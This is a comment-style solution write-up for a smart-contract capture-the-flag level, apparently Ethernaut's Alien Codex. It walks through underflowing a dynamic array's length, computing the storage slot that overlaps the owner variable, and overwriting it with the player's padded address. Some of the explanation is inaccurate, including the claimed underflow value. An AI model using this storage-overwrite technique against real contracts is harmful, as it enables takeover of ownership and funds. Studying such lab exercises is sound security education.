/*
Solution:

1. change contact bool into true to enable the usage of retract(), revise()

contract.make_contact();

2. Explanation: Dynamic Arrays are vulnerable to underflow attacks -> if you array.length-- on an array with the value
of 0, the array.length will underflow and equal the highest possible value inside the EVM Storage (EVM can store up to 2**256 32bytes inside storage).
The new array.length wouldn't equal -1, it would equal 2**256 (very large num).
If the array.length equals all possible storage, you can freely manipulate all data inside the array.

Actual step:

contract.retract();

3. Find out where the owner variable is inside the array.
  
  
  find where the first array element is stored
  
  p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1] ))
  
  find where the owner variable is stored
  
  i = BigInt(2**256) - BigInt(p)

4. change owner to our address

  Explanation: We are abusing a flaw in the ABI specs, the array is of type 32bytes (which means it expects values that equal 32bytes). Just inputting an address
  (which equals 20bytes) wouldn't cut it. To be able to enter an address into an 32bytes Array we abuse the ABI specs which doesn't validate that the length
  of the array matches the length of the payload (e.g. 0'd out). That means we can add a bunch of 0's (24 in this example to be exact), infront of our address
  and turn it into an 32bytes large slot and fullfill the array requirements.
  
  
            (declare hex)     (24, 0's)        (remove 0x from our address)
  content = "0x"            + "0".repeat(24) + player.slice(2)

  
  contract.revise(i, content, {from: player, gas:90000});
  
*/
